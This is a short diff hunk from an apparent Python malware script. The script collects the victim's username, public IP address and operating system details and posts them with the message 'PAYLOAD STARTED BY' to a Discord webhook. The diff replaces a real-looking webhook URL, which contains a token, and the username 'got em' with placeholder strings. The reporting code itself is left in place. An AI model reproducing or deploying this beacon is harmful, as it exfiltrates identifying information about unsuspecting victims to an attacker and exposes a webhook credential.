@@ -69,10 +69,10 @@ Username = getpass.getuser()
 
 GetThe = requests.post('https://icanhazip.com').text
 
-webhook = 'https://discord.com/api/webhooks/830075882063921163/aBO6OEpTmQFHU_ogEFh9qlKH846S19AZEI5ui1DjEtqaz_OGLyKKC2QKwtWHHAJnJ_Kz'
+webhook = 'discordwebhook'
 
 send = {
-    "username": "got em",
+    "username": "webhookusername",
     "content": "PAYLOAD STARTED BY " + Username + " FROM " + GetThe + OsInfo
 }
 
